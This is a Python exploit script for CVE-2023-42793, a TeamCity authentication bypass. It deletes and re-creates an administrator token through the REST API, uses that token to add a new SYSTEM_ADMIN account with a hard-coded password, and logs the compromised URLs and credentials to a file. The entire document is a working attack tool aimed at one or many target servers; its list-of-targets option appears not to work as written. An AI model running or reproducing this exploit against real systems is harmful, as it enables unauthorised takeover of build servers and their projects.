#!/usr/bin/python3
import random
import requests
import argparse
import xml.etree.ElementTree as ET

Color_Off="\033[0m" 
Black="\033[0;30m"        # Black
Red="\033[0;31m"          # Red
Green="\033[0;32m"        # Green
Yellow="\033[0;33m"       # Yellow
Blue="\033[0;34m"         # Blue
Purple="\033[0;35m"       # Purple
Cyan="\033[0;36m"         # Cyan
White="\033[0;37m"        # White

class CVE_2023_42793:
    def __init__(self):
        self.url = ""
        self.session = requests.session()

    def username(self):
        name = "H454NSec"
        random_id = random.randint(1000, 9999)
        return f"{name}{random_id}"

    def delete_user_token(self, url):
        self.url = url
        headers = {
            "User-Agent": "Mozilla/5.0 (https://github.com/H454NSec/CVE-2023-42793) Gecko/20100101 Firefox/113.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip, deflate"
            }
        try:
            response = self.session.delete(f"{self.url}/app/rest/users/id:1/tokens/RPC2", headers=headers, timeout=10)
            if response.status_code == 204 or  response.status_code == 404:
                self.create_user_token()
        except Exception as err:
            pass

    def create_user_token(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (https://github.com/H454NSec/CVE-2023-42793) Gecko/20100101 Firefox/113.0",
            "Accept-Encoding": "gzip, deflate"
            }
        try:
            response = self.session.post(f"{self.url}/app/rest/users/id:1/tokens/RPC2", headers=headers, timeout=10)
            if response.status_code == 200:
                response_text = response.text
                root = ET.fromstring(response_text)
                value = root.get('value')
                if value.startswith("eyJ0eXAiOiAiVENWMiJ9"):
                    self.create_user(value)
        except Exception as err:
            pass

    def create_user(self, token):
        uname = self.username()
        headers = {
            "User-Agent": "Mozilla/5.0 (https://github.com/H454NSec/CVE-2023-42793) Gecko/20100101 Firefox/113.0",
            "Accept": "*/*",
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
            }
        creds = {
            "email": "",
            "username": uname,
            "password": "@H454NSec",
            "roles": {
                "role": [{
                        "roleId": "SYSTEM_ADMIN",
                        "scope": "g"
                    }]
            }
        }
        try:
            response = self.session.post(f"{self.url}/app/rest/users", headers=headers, json=creds, timeout=10)
            if response.status_code == 200:
                print(f"{Green}[+] {Yellow}{self.url}/login.html {Green}[{uname}:@H454NSec]{Color_Off}")
                with open("vulnerable.txt", "a") as o:
                    o.write(f"[{uname}:@H454NSec] {self.url}\n")
        except Exception as err:
            pass

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help='Url of the TeamCity')
    parser.add_argument('-l', '--list', help='List of urls')
    args = parser.parse_args()
    db = []
    url_list = args.list
    if url_list:
        try:
            with open(url_list, "r") as fr:
                for data in fr.readlines():
                    db.append(data.strip())
        except Exception as err:
            print(err)
    elif args.url:
        db.append(args.url)
        cve = CVE_2023_42793()
        for ip in db:
            url = ip[:-1] if ip.endswith("/") else ip
            if not url.startswith("https://"):
                if not url.startswith("http://"):
                    url = f"http://{url}"
            cve.delete_user_token(url)